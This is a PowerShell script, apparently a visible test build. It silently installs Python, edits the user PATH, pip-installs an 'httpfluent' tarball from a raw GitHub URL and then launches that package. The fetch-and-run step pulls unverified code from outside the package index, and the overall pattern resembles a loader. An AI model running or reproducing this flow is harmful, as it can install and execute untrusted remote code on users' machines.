# ===================================================
# Python 3.12.6 + httpfluent (FOREGROUND TEST)
# ===================================================

$InstallDir = "$env:LOCALAPPDATA\Programs\Python\Python312"
$PythonExe = Join-Path $InstallDir "python.exe"
$InstallRequired = $true

Write-Host "[*] Starting Pre-check..." -ForegroundColor Cyan

# --- Step 0: Pre-Check ---
if (Get-Command python -ErrorAction SilentlyContinue) {
    $ExecutableToUse = "python"
} elseif (Test-Path $PythonExe) {
    $ExecutableToUse = $PythonExe
}

if ($ExecutableToUse) {
    $VersionString = & $ExecutableToUse --version 2>&1
    if ($VersionString -match "Python (\d+\.\d+\.\d+)") {
        if ([version]$Matches[1] -ge [version]"3.9") {
            Write-Host "[+] Python $($Matches[1]) is already okay." -ForegroundColor Green
            $InstallRequired = $false
        }
    }
}

# --- YOUR ALGORITHM (Installation) ---
if ($InstallRequired) {
    $PythonVersion = "3.12.6"
    $PythonInstaller = "python-$PythonVersion-amd64.exe"
    $DownloadUrl = "https://www.python.org/ftp/python/$PythonVersion/$PythonInstaller"
    $DownloadDir = "$env:TEMP\Python"

    if (-not (Test-Path $DownloadDir)) { New-Item -ItemType Directory -Path $DownloadDir | Out-Null }
    $InstallerPath = Join-Path $DownloadDir $PythonInstaller

    Write-Host "[*] Downloading Python..." -ForegroundColor Yellow
    (New-Object System.Net.WebClient).DownloadFile($DownloadUrl, $InstallerPath)

    Write-Host "[*] Installing Python (Silent)..." -ForegroundColor Yellow
    Start-Process -FilePath $InstallerPath -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1 Include_test=0 TargetDir=`"$InstallDir`"" -Wait

    # Update Path
    $OldPath = [Environment]::GetEnvironmentVariable("Path","User")
    $NewPath = "$InstallDir;$InstallDir\Scripts;" + ($OldPath -replace [regex]::Escape("$env:LOCALAPPDATA\Microsoft\WindowsApps;"),"")
    [Environment]::SetEnvironmentVariable("Path",$NewPath,"User")
    $env:Path = $NewPath
    $ExecutableToUse = $PythonExe
}

# --- Step 7: Package Installation ---
Write-Host "[*] Installing dependencies..." -ForegroundColor Yellow
& $ExecutableToUse -m pip install --upgrade pip --quiet
& $ExecutableToUse -m pip install requests --quiet
& $ExecutableToUse -m pip install "https://github.com/httpfluent/Intranetflow/raw/main/v1.0/httpfluent-0.1.tar.gz" --quiet

# --- STEP 8: LAUNCH IN FOREGROUND ---
Write-Host "[!] Launching httpfluent in FOREGROUND for testing..." -ForegroundColor Cyan
Write-Host "[!] Look at the window that opens to see errors." -ForegroundColor Yellow

# This will open a new visible window
Start-Process -FilePath $ExecutableToUse -ArgumentList "-m httpfluent" -NoNewWindow:$false

# --- Step 9: Cleanup ---
if (Test-Path "$env:TEMP\Python") {
    Remove-Item "$env:TEMP\Python" -Recurse -Force -ErrorAction SilentlyContinue
}

Write-Host "[SUCCESS] Script finished. Check the new window for httpfluent output."
